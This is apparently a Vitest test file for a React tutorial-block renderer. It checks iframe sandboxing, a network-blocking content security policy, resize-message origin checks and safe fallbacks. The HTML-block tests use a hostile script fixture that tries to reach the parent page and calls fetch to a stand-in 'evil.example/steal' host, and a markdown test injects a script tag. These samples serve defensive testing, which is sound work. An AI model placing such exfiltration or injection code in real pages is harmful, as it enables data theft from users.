import { act, render, screen, waitFor } from "@testing-library/react";
import { describe, expect, it, vi } from "vitest";
import { HTML_BLOCK_CSP, sandboxedDocument } from "./html-frame";
import { TutorialBlockView } from "./renderer-registry";

vi.mock("mermaid", () => ({
  default: {
    initialize: vi.fn(),
    render: vi.fn(async (_id: string, source: string) => {
      if (!source.startsWith("flowchart")) throw new Error("parse error");
      return { svg: '<svg data-testid="diagram"></svg>' };
    }),
  },
}));

function cspDirectives(): Map<string, string> {
  return new Map(
    HTML_BLOCK_CSP.split(";").map((part) => {
      const [name, ...values] = part.trim().split(/\s+/);
      return [name, values.join(" ")];
    }),
  );
}

describe("html blocks", () => {
  const hostile = [
    "<!doctype html><html><head><script>",
    "try { parent.document.title = 'owned' } catch (e) {}",
    "fetch('https://evil.example/steal')",
    "</script></head><body>hi</body></html>",
  ].join("");

  it("run in a frame that cannot reach this page: scripts only, no same-origin", () => {
    render(<TutorialBlockView renderer="html" payload={{ html: hostile, title: "T" }} />);
    const frame = screen.getByTitle("T");
    expect(frame.tagName).toBe("IFRAME");
    expect(frame.getAttribute("sandbox")).toBe("allow-scripts");
    expect(frame.getAttribute("sandbox")).not.toContain("allow-same-origin");
    expect(frame.getAttribute("sandbox")).not.toContain("allow-top-navigation");
  });

  it("run under a CSP that blocks the network, placed before any of the block's own code", () => {
    const document = sandboxedDocument(hostile);
    expect(document.startsWith('<!doctype html><meta http-equiv="Content-Security-Policy"')).toBe(
      true,
    );
    expect(document.indexOf("Content-Security-Policy")).toBeLessThan(document.indexOf("<script"));
    const csp = cspDirectives();
    expect(csp.get("default-src")).toBe("'none'");
    expect(csp.get("connect-src")).toBe("'none'");
    expect(csp.get("img-src")).toBe("data:");
    expect(csp.get("form-action")).toBe("'none'");
    // Nothing in the policy names a host or allows a scheme that reaches one.
    expect(HTML_BLOCK_CSP).not.toMatch(/https?:|\*|'self'/);
    // Without a doctype the policy is the very first thing in the document.
    expect(sandboxedDocument("<p>x</p>").startsWith("<meta http-equiv")).toBe(true);
  });

  it("resize only on messages from their own frame", () => {
    render(<TutorialBlockView renderer="html" payload={{ html: "<p>x</p>", title: "T" }} />);
    const frame = screen.getByTitle("T") as HTMLIFrameElement;
    const before = frame.style.height;
    act(() => {
      window.dispatchEvent(
        new MessageEvent("message", {
          data: { type: "tutorial-block-resize", height: 900 },
          source: window,
        }),
      );
    });
    expect(frame.style.height).toBe(before);
    act(() => {
      window.dispatchEvent(
        new MessageEvent("message", {
          data: { type: "tutorial-block-resize", height: 900 },
          source: frame.contentWindow,
        }),
      );
    });
    expect(frame.style.height).toBe("900px");
  });
});

describe("the renderer registry", () => {
  it("shows a safe fallback for an unknown renderer", () => {
    render(<TutorialBlockView renderer="pdf" payload={{ html: "<b>x</b>" }} />);
    expect(screen.getByText(/unknown format "pdf"/)).toBeInTheDocument();
    expect(document.querySelector("iframe")).toBeNull();
  });

  it("shows the fallback for a payload missing its fields", () => {
    render(<TutorialBlockView renderer="markdown" payload={{ text: "x" }} />);
    expect(screen.getByText(/its content is incomplete/)).toBeInTheDocument();
  });

  it("does not resolve inherited names as renderers", () => {
    render(<TutorialBlockView renderer="constructor" payload={{}} />);
    expect(screen.getByText(/unknown format "constructor"/)).toBeInTheDocument();
  });

  it("renders markdown without raw html or images", () => {
    const { container } = render(
      <TutorialBlockView
        renderer="markdown"
        payload={{
          markdown:
            "**Misconception:** x\n\n<script>alert(1)</script>\n\n![x](https://e.example/a.png)",
        }}
      />,
    );
    expect(screen.getByText("Misconception:").tagName).toBe("STRONG");
    expect(container.querySelector("script")).toBeNull();
    expect(container.querySelector("img")).toBeNull();
  });

  it("draws a mermaid diagram, and shows the source when it does not parse", async () => {
    render(
      <TutorialBlockView
        renderer="mermaid"
        payload={{ mermaid: "flowchart TD\n A-->B", caption: "Look at B" }}
      />,
    );
    await waitFor(() => expect(screen.getByTestId("diagram")).toBeInTheDocument());
    expect(screen.getByText("Look at B")).toBeInTheDocument();

    render(<TutorialBlockView renderer="mermaid" payload={{ mermaid: "nonsense" }} />);
    await waitFor(() =>
      expect(screen.getByText("This diagram could not be drawn.")).toBeInTheDocument(),
    );
  });
});
